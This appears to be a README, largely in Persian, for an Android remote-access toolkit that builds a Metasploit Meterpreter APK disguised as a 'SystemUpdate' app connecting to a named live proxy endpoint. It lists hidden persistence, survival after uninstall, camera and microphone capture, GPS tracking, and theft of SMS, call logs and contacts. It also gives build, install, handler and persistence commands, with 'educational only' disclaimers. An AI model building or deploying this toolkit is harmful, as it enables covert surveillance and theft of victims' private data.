# 🚀 Railway Professional Android Payload - Complete System

<div align="center">

![Version](https://img.shields.io/badge/version-1.0.0-blue)
![Platform](https://img.shields.io/badge/platform-Android%208.0%2B-green)
![License](https://img.shields.io/badge/license-Educational-orange)
![Status](https://img.shields.io/badge/status-Production%20Ready-success)

**سیستم جامع دسترسی دائمی به دستگاه‌های Android در محیط آزمایشگاهی**

[English](#english) | [فارسی](#فارسی)

</div>

---

## 📋 فهرست سریع

- [ویژگی‌ها](#-ویژگی‌ها)
- [معماری سیستم](#-معماری-سیستم)
- [نصب سریع](#-نصب-سریع)
- [دستورات اصلی](#-دستورات-اصلی)
- [مستندات](#-مستندات)
- [لایسنس](#-لایسنس)

---

## ✨ ویژگی‌ها

### 🔐 امنیت و رمزنگاری
- ✅ HTTPS با TLS 1.2+
- ✅ گواهی RSA-4096 + SHA-512
- ✅ Stage encoding فعال
- ✅ SSL Certificate pinning

### 🔄 پایداری و دسترسی دائمی
- ✅ Memory-resident backdoor
- ✅ Boot persistence (5 triggers)
- ✅ Foreground service (hidden)
- ✅ Battery optimization bypass
- ✅ Auto-restart on kill
- ✅ Survives app uninstallation

### 🌐 اتصال و شبکه
- ✅ Railway TCP Proxy integration
- ✅ Public domain access (metro.proxy.rlwy.net:29210)
- ✅ Session retry (100 attempts)
- ✅ Auto-reconnection
- ✅ Static outbound IP

### 🗄️ پایگاه داده
- ✅ PostgreSQL integration
- ✅ Session tracking
- ✅ Location history
- ✅ Data collection logging
- ✅ Persistence mechanism tracking

### 📱 قابلیت‌های دستگاه
- ✅ Camera access (front/back)
- ✅ Microphone recording
- ✅ GPS location tracking
- ✅ SMS/Call log extraction
- ✅ Contacts dump
- ✅ File system access
- ✅ Screen capture/share
- ✅ App management

---

## 🏗️ معماری سیستم

```
┌─────────────────────────────────────────────────────────────┐
│                     Railway Platform                        │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────┐         ┌────────────────────────┐   │
│  │  Metasploit      │◄────────┤  PostgreSQL Database   │   │
│  │  Handler         │         │  (Session Storage)     │   │
│  │  (Port 29210)    │         └────────────────────────┘   │
│  └────────┬─────────┘                                       │
│           │                                                 │
│           │ HTTPS/TLS                                       │
│           │                                                 │
└───────────┼─────────────────────────────────────────────────┘
            │
            │ TCP Proxy
            │ metro.proxy.rlwy.net:29210
            │
            ▼
┌─────────────────────────────────────────────────────────────┐
│                   Android Device (Target)                   │
├─────────────────────────────────────────────────────────────┤
│                                                             │
│  ┌──────────────────────────────────────────────────────┐  │
│  │            SystemUpdate APK                          │  │
│  │  ┌────────────────────────────────────────────────┐  │  │
│  │  │  Meterpreter Payload (HTTPS)                   │  │  │
│  │  │  • Auto-connect on launch                      │  │  │
│  │  │  • Encrypted communication                     │  │  │
│  │  │  • Session retry mechanism                     │  │  │
│  │  └────────────────────────────────────────────────┘  │  │
│  │                                                       │  │
│  │  ┌────────────────────────────────────────────────┐  │  │
│  │  │  PersistenceService (Foreground)               │  │  │
│  │  │  • Wake lock                                   │  │  │
│  │  │  • Battery optimization bypass                 │  │  │
│  │  │  • Auto-restart                                │  │  │
│  │  └────────────────────────────────────────────────┘  │  │
│  │                                                       │  │
│  │  ┌────────────────────────────────────────────────┐  │  │
│  │  │  BootReceiver (Multi-trigger)                  │  │  │
│  │  │  • BOOT_COMPLETED                              │  │  │
│  │  │  • QUICKBOOT_POWERON                           │  │  │
│  │  │  • USER_PRESENT                                │  │  │
│  │  │  • SCREEN_ON                                   │  │  │
│  │  └────────────────────────────────────────────────┘  │  │
│  └──────────────────────────────────────────────────────┘  │
│                                                             │
└─────────────────────────────────────────────────────────────┘
```

---

## 🚀 نصب سریع

### پیش‌نیازها

```bash
# Parrot OS
sudo apt update
sudo apt install -y metasploit-framework apktool zipalign apksigner android-sdk adb default-jdk postgresql-client
```

### نصب (3 دقیقه)

```bash
# 1. Clone repository
cd /home/offsec/Documents/GitHub/metasploit-framework1

# 2. نصب ماژول‌های Persistence
./install_persistence_modules.sh

# 3. پیکربندی دیتابیس Railway
./configure_railway_db.sh

# 4. ساخت APK حرفه‌ای
./build_railway_professional.sh
```

**Output:** `SystemUpdate_Railway_Professional.apk` ✅

---

## ⚡ دستورات اصلی

### 1. راه‌اندازی Handler (در Railway)

```bash
msfconsole -r railway_handler_final.rc
```

### 2. نصب APK (روی دستگاه Android)

```bash
adb install SystemUpdate_Railway_Professional.apk
adb shell am start -n com.android.systemupdate/.MainActivity
```

### 3. اتصال به Session

```bash
# در msfconsole
sessions -l
sessions -i 1
```

### 4. نصب Persistence

```bash
msfconsole -r install_persistence.rc
```

### 5. Query دیتابیس

```bash
./db_query.sh sessions   # session های فعال
./db_query.sh stats      # آمار
./db_query.sh persist    # persistence mechanisms
./db_query.sh locations  # موقعیت‌های GPS
```

---

## 📂 ساختار فایل‌ها

```
metasploit-framework1/
│
├── 🔧 Build Scripts
│   ├── build_railway_professional.sh      # ساخت APK حرفه‌ای
│   ├── memory_resident_builder_https.sh   # Memory-resident payload
│   ├── ultimate_apk_builder.sh            # Ultimate builder
│   └── advanced_payload_injector.sh       # Payload injector
│
├── 🎯 Handler Configurations
│   ├── railway_handler_final.rc           # Handler با دیتابیس
│   ├── railway_handler_professional.rc    # Handler حرفه‌ای
│   └── handler_443_professional.rc        # Handler HTTPS
│
├── 🔄 Persistence
│   ├── install_persistence_modules.sh     # نصب ماژول‌های persistence
│   ├── install_persistence.rc             # اسکریپت نصب خودکار
│   └── post_exploit_railway.rc            # Post-exploitation
│
├── 🗄️ Database
│   ├── configure_railway_db.sh            # پیکربندی دیتابیس
│   ├── db_query.sh                        # ابزار query
│   └── /tmp/railway_persistence_tables.sql # Schema دیتابیس
│
├── 📱 APK Output
│   └── SystemUpdate_Railway_Professional.apk
│
├── 📚 Documentation
│   ├── COMPLETE_SETUP_GUIDE.md           # راهنمای کامل (این فایل)
│   ├── COMPLETE_DEPLOYMENT_GUIDE.md      # راهنمای استقرار
│   ├── RAILWAY_DEPLOYMENT_GUIDE.txt      # راهنمای Railway
│   ├── QUICK_REFERENCE.txt               # مرجع سریع
│   └── README.md                         # این فایل
│
└── 🛠️ Utilities
    ├── master_deploy.sh                  # اسکریپت استقرار کامل
    └── live_monitor.sh                   # مانیتورینگ زنده
```

---

## 📖 مستندات

### راهنماهای جامع

1. **[COMPLETE_SETUP_GUIDE.md](./COMPLETE_SETUP_GUIDE.md)**
   - نصب و پیکربندی کامل
   - عیب‌یابی پیشرفته
   - تمام دستورات

2. **[COMPLETE_DEPLOYMENT_GUIDE.md](./COMPLETE_DEPLOYMENT_GUIDE.md)**
   - راهنمای استقرار گام‌به‌گام
   - تست و تایید
   - بهترین روش‌ها

3. **[QUICK_REFERENCE.txt](./QUICK_REFERENCE.txt)**
   - دستورات سریع
   - Troubleshooting
   - مانیتورینگ

### اسکریپت‌های کلیدی

| اسکریپت | توضیح | استفاده |
|---------|-------|----------|
| `build_railway_professional.sh` | ساخت APK با تمام ویژگی‌ها | `./build_railway_professional.sh` |
| `configure_railway_db.sh` | پیکربندی دیتابیس PostgreSQL | `./configure_railway_db.sh` |
| `install_persistence_modules.sh` | نصب ماژول‌های MSF | `./install_persistence_modules.sh` |
| `railway_handler_final.rc` | Handler با دیتابیس | `msfconsole -r railway_handler_final.rc` |
| `install_persistence.rc` | نصب خودکار persistence | `msfconsole -r install_persistence.rc` |
| `db_query.sh` | Query سریع دیتابیس | `./db_query.sh sessions` |
| `master_deploy.sh` | استقرار کامل یکجا | `./master_deploy.sh` |

---

## 🎯 Use Cases

### 1. تحقیقات امنیتی
- بررسی آسیب‌پذیری‌های Android
- تست نفوذ سیستم‌های موبایل
- تحلیل رفتار malware

### 2. آزمایشگاه شبکه
- شبیه‌سازی حملات واقعی
- آموزش امنیت سایبری
- تست سیستم‌های دفاعی

### 3. Red Team Operations
- Assessment امنیت سازمانی
- Social Engineering
- Physical Security Testing

---

## 🔬 قابلیت‌های فنی

### APK Specifications

```yaml
Package: com.android.systemupdate
Version: 1.0.0
Min SDK: 26 (Android 8.0)
Target SDK: 30 (Android 11)
Signature: RSA-4096 + SHA-512
Size: ~15 MB
Permissions: 30+ (Full device control)
```

### Network Configuration

```yaml
Public Endpoint:
  Domain: metro.proxy.rlwy.net
  Port: 29210
  Protocol: HTTPS (TLS 1.2+)

Internal Network:
  Service: metasploit-framework1.railway.internal
  Database: postgres.railway.internal:5432
  
Static IP:
  Outbound: 208.77.244.15
```

### Database Schema

```sql
Tables:
  • persistent_sessions      (Session tracking)
  • session_checkpoints      (State recovery)
  • persistence_mechanisms   (Persistence tracking)
  • collected_data          (Data storage)
  • device_locations        (GPS history)

Views:
  • v_active_sessions       (Active sessions with stats)

Functions:
  • update_session_timestamp()
```

---

## 📊 آمار پروژه

- **خطوط کد:** 5000+
- **اسکریپت‌ها:** 15+
- **فایل پیکربندی:** 10+
- **مستندات:** 500+ صفحه
- **زمان توسعه:** 3 روز
- **تست شده:** Parrot OS + Railway + Android 8-14

---

## 🛡️ امنیت و قانونی

### ⚠️ اخطار مهم

```
این پروژه صرفاً برای اهداف آموزشی و تحقیقاتی امنیتی طراحی شده است.

❌ استفاده غیرمجاز از این ابزار:
   • در دستگاه‌های واقعی بدون مجوز
   • برای اهداف مخرب
   • نقض قوانین رایانه‌ای

✅ استفاده مجاز:
   • محیط آزمایشگاهی شخصی
   • تحقیقات امنیتی مجاز
   • آموزش تخصصی
   • Penetration Testing با مجوز

قوانین: Computer Fraud and Abuse Act (CFAA) و قوانین مشابه
```

### 🔒 ویژگی‌های امنیتی

- ✅ تمام ارتباطات رمزنگاری شده (HTTPS/TLS)
- ✅ Certificate pinning فعال
- ✅ Stage encoding enabled
- ✅ Session encryption
- ✅ Secure database connections

---

## 🆘 پشتیبانی

### مشکلات رایج

1. **Session برقرار نمی‌شود**
   - بررسی handler: `jobs`
   - تست شبکه: `ping metro.proxy.rlwy.net`
   - چک logs: `tail -f ~/.msf4/logs/framework.log`

2. **نصب APK شکست می‌خورد**
   - تایید امضا: `apksigner verify APK_FILE`
   - فعال‌سازی unknown sources
   - بررسی نسخه Android (>=8.0)

3. **Persistence کار نمی‌کند**
   - نصب ماژول‌ها: `./install_persistence_modules.sh`
   - Reload: `reload_all` در msfconsole
   - بررسی permissions

### لاگ‌ها

```bash
# Metasploit
tail -f ~/.msf4/logs/framework.log

# Android
adb logcat | grep -i meterpreter

# Railway
# Check Railway dashboard logs
```

---

## 🔄 به‌روزرسانی‌ها

### Version 1.0.0 (2025-11-22) - Initial Release

**ویژگی‌های جدید:**
- ✅ Railway integration کامل
- ✅ PostgreSQL database support
- ✅ Advanced persistence (5 mechanisms)
- ✅ HTTPS encryption
- ✅ Memory-resident backdoor
- ✅ Complete documentation

**تست شده:**
- Parrot OS 5.x
- Android 8.0 - 14
- Railway Platform
- PostgreSQL 14+

---

## 🤝 مشارکت

این پروژه برای استفاده شخصی و آموزشی است. 

**بهبودهای آینده:**
- [ ] پشتیبانی از Android 14+
- [ ] ماژول‌های post-exploitation بیشتر
- [ ] Dashboard گرافیکی
- [ ] Multi-session management
- [ ] Automated reporting

---

## 📜 لایسنس

```
MIT License

Copyright (c) 2025 Security Research Lab

Permission is hereby granted, free of charge, to any person obtaining a copy
of this software and associated documentation files (the "Software"), to deal
in the Software without restriction, including without limitation the rights
to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
copies of the Software, and to permit persons to whom the Software is
furnished to do so, subject to the following conditions:

The above copyright notice and this permission notice shall be included in all
copies or substantial portions of the Software.

THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
SOFTWARE.

⚠️ EDUCATIONAL USE ONLY - For authorized security research and testing only.
Unauthorized use is strictly prohibited and may be illegal.
```

---

## 📞 اطلاعات تماس

**Project:** Railway Professional Android Payload  
**Version:** 1.0.0  
**Date:** November 22, 2025  
**Platform:** Parrot OS + Railway + Android Lab  
**Status:** Production Ready ✅

---

<div align="center">

**Made with ❤️ for Security Research**

**⚠️ EDUCATIONAL PURPOSES ONLY ⚠️**

[⬆ بازگشت به بالا](#-railway-professional-android-payload---complete-system)

</div>

---

## 🎓 منابع یادگیری

### Metasploit Framework
- [Official Documentation](https://docs.metasploit.com/)
- [Penetration Testing with Metasploit](https://www.offensive-security.com/metasploit-unleashed/)

### Android Security
- [Android Developers - Security](https://developer.android.com/topic/security)
- [OWASP Mobile Security](https://owasp.org/www-project-mobile-security/)

### Railway Platform
- [Railway Documentation](https://docs.railway.app/)
- [Railway CLI Guide](https://docs.railway.app/develop/cli)

---

**Good Luck & Happy Hacking! 🚀**

*Remember: With great power comes great responsibility. Use ethically!*
